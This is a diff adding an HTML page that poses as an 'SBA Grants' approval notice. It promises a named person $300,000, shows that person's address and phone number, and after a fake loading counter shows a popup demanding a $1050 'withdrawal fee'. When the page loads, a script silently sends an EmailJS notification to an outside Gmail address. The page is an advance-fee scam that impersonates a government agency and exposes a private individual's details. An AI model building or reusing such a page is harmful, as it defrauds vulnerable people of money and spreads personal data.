@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grant Approval - SBA Grants</title>
+  <style>
+    body {
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Arial', sans-serif;
+      overflow: hidden;
+    }
+
+    .container {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 600px;
+      width: 90%;
+      position: relative;
+      z-index: 1;
+    }
+
+    .loader-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      flex-direction: column;
+    }
+
+    .ring {
+      border: 8px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 8px solid #4CAF50;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+    }
+
+    .counter {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333333;
+      margin-top: 20px;
+    }
+
+    h1, h2, p {
+      color: #333333;
+      margin: 10px 0;
+    }
+
+    .approval-message {
+      background-color: #4CAF50;
+      color: #FFFFFF;
+      padding: 15px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+
+    .amount {
+      font-size: 36px;
+      font-weight: bold;
+      color: #4CAF50;
+      margin-bottom: 20px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 20px;
+    }
+
+    th, td {
+      border: 1px solid #CCCCCC;
+      padding: 10px;
+      text-align: left;
+    }
+
+    th {
+      background-color: #f9f9f9;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1001;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.4);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background-color: #d1f2eb;
+      margin: auto;
+      padding: 20px;
+      border: 1px solid #888;
+      width: 80%;
+      max-width: 300px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+      color: black;
+      text-decoration: none;
+      cursor: pointer;
+    }
+  </style>
+  <!-- Include EmailJS SDK -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("tfsKkXvQezfsoidfX"); // Replace with your EmailJS user ID
+    })();
+  </script>
+</head>
+<body>
+  <div class="loader-container">
+    <div class="ring"></div>
+    <div class="counter">0%</div>
+  </div>
+
+  <div class="container">
+    <h1>Grant Approval</h1>
+    <div class="approval-message">
+      <h2>Congratulations!</h2>
+      <p>Your grant application has been approved, and funds will be transferred to the provided bank details soon.</p>
+      <p>Please be patient, and the money transfer will be processed shortly.</p>
+    </div>
+    <div class="amount">$300,000</div>
+    <h2>Applicant Details</h2>
+    <table>
+      <tr>
+        <th>Name</th>
+        <td>William Nelson</td>
+      </tr>
+      <tr>
+        <th>Business Name</th>
+        <td>WNelsonEnt LLC</td>
+      </tr>
+      <tr>
+        <th>Address</th>
+        <td>146-14 184th st Springfield Gardens, NY 11413</td>
+      </tr>
+      <tr>
+        <th>Phone Number</th>
+        <td>646-549-1206</td>
+      </tr>
+    </table>
+    <p>
+      Thank you for choosing SBA grants to support your business growth and success. We appreciate your patience!
+    </p>
+  </div>
+
+  <!-- The Modal -->
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <p>You're very close to securing the funds—just one more step and you're all set!. You MUST make the last payment WITHDRAWAL FEE <span style="color: #2dc26b; font-size: 14pt;"><strong>$1050</strong></span></p>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      let counter = 0;
+      const counterElement = document.querySelector('.counter');
+      const loaderContainer = document.querySelector('.loader-container');
+      const container = document.querySelector('.container');
+      const modal = document.getElementById('myModal');
+      const span = document.getElementsByClassName('close')[0];
+
+      const interval = setInterval(() => {
+        if (counter < 100) {
+          counter++;
+          counterElement.textContent = counter + '%';
+        } else {
+          clearInterval(interval);
+          loaderContainer.style.display = 'none';
+          modal.style.display = 'flex';
+
+          // Send email using EmailJS
+          emailjs.send('service_dp6srfd', 'template_e0dfeth', {
+            to_email: 'marshall12340@gmail.com',
+          })
+          .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+          }, function(error) {
+            console.log('FAILED...', error);
+          });
+        }
+      }, 100);
+
+      // When the user clicks on <span> (x), close the modal
+      span.onclick = function() {
+        modal.style.display = 'none';
+      }
+
+      // When the user clicks anywhere outside of the modal, close it
+      window.onclick = function(event) {
+        if (event.target == modal) {
+          modal.style.display = 'none';
+        }
+      }
+    });
+  </script>
+</body>
+</html>
